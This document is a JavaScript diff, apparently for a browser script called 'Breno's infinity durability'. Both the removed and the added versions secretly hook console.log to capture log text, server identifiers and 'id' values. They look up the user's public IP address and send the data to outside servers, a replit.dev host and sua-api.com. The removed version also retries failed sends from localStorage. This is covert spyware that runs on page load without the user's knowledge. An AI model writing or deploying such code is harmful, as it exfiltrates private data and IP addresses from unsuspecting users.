@@ -1,78 +1,54 @@
 var originalLog = console.log;
-var localStorageKey = 'logMessages';
+console.log = function() {
 
-// Função para enviar logs armazenados
-function sendStoredLogs() {
-    var storedLogs = JSON.parse(localStorage.getItem(localStorageKey)) || [];
-    if (storedLogs.length > 0) {
-        storedLogs.forEach(function(logEntry, index) {
-            var xhrPost = new XMLHttpRequest();
-            xhrPost.open('POST', 'https://482f5134-6dcf-4770-af34-1ee5d411512d-00-1dblg66wzgy4i.spock.replit.dev/get', true);
-            xhrPost.setRequestHeader('Content-Type', 'application/json');
-            xhrPost.onload = function() {
-                if (xhrPost.status === 200) {
-                    console.log('Log enviado com sucesso para o servidor:', logEntry);
-                    storedLogs.splice(index, 1); // Remove o log enviado
-                    localStorage.setItem(localStorageKey, JSON.stringify(storedLogs)); // Atualiza o localStorage
-                } else {
-                    console.error('Erro ao enviar log para o servidor:', xhrPost.status);
-                }
-            };
-            xhrPost.onerror = function() {
-                console.error('Erro ao enviar log para o servidor:', xhrPost.status);
-            };
-            xhrPost.send(JSON.stringify(logEntry));
+    var logMessage = Array.prototype.slice.call(arguments).join(' ');
+
+    originalLog.apply(console, arguments);
+
+    var phrases = ['Set current server:', '"id":'];
+
+    phrases.forEach(function(phrase) {
+        if (logMessage.includes(phrase)) {
+
+            var startIndex = logMessage.indexOf(phrase) + phrase.length;
+
+            var content = logMessage.slice(startIndex).trim();
+
+            localStorage.setItem('content', content);
+            }
         });
+    };
+
+async function cap() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        al("Breno's infinity durability", 'an error ocured');
     }
 }
 
-// Redefine console.log para armazenar logs e tentar enviar
-console.log = function() {
-    var logMessage = Array.prototype.slice.call(arguments).join(' ');
-    originalLog.apply(console, arguments);
+const content = localStorage.getItem('content');
 
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', 'https://api64.ipify.org?format=json', true);
-    xhr.onload = function() {
-        if (xhr.status === 200) {
-            var data = JSON.parse(xhr.responseText);
-            var user = data.ip;
-
-            var logEntry = { user: user, logMessage: logMessage };
-            var xhrPost = new XMLHttpRequest();
-            xhrPost.open('POST', 'https://482f5134-6dcf-4770-af34-1ee5d411512d-00-1dblg66wzgy4i.spock.replit.dev/get', true);
-            xhrPost.setRequestHeader('Content-Type', 'application/json');
-            xhrPost.onload = function() {
-                if (xhrPost.status === 200) {
-                    console.log('Log enviado com sucesso para o servidor');
-                } else {
-                    console.error('Erro ao enviar log para o servidor:', xhrPost.status);
-                    storeLog(logEntry); // Armazena o log se houver erro
-                }
-            };
-            xhrPost.onerror = function() {
-                console.error('Erro ao enviar log para o servidor:', xhrPost.status);
-                storeLog(logEntry); // Armazena o log se houver erro
-            };
-            xhrPost.send(JSON.stringify(logEntry));
-        } else {
-            console.error('Erro ao obter IP:', xhr.status);
-        }
-    };
-    xhr.onerror = function() {
-        console.error('Erro ao obter IP:', xhr.status);
-    };
-    xhr.send();
-};
-
-// Função para armazenar logs no localStorage
-function storeLog(logEntry) {
-    var storedLogs = JSON.parse(localStorage.getItem(localStorageKey)) || [];
-    storedLogs.push(logEntry);
-    localStorage.setItem(localStorageKey, JSON.stringify(storedLogs));
+async function sn(ip) {
+    const response = await fetch('https://sua-api.com/enviar-ip', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ ip, content }),
+    });
 }
 
-// Tenta enviar logs armazenados ao carregar a página
-window.onload = function() {
-    sendStoredLogs();
-};
+function al(n, m) {
+    alert(n + '\n' + m);
+}
+
+async function main() {
+    const ip = await cap();
+    if (ip) {
+        await sn(ip);
+    }
+}
+main();
